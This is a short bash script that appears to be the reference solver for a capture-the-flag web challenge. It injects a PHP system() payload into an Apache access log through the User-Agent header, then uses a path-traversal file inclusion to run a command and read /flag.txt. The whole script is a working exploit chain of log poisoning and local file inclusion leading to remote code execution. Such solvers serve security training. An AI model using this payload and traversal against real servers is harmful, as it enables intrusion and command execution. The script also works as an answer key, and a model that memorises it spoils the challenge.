#!/usr/bin/env bash
# 02 · log-poison reference solver
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"

echo "[*] Step 1: poison the Apache access log via User-Agent..."
# Use single quotes: Apache escapes double-quotes ( " -> \" ) in the log, which
# would corrupt the injected PHP.
curl -s -A "<?php system('/usr/local/bin/ctf-shell ' . escapeshellarg(\$_GET['c'] ?? '')); ?>" "${BASE}/" >/dev/null

echo "[*] Step 2: include the log and run a command..."
# Apache access log inside the php:apache image:
LOG="/var/log/apache2/access.log"
curl -s -G "${BASE}/" \
  --data-urlencode "page=../../../../..${LOG}" \
  --data-urlencode "c=cat /flag.txt" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}' | head -n1
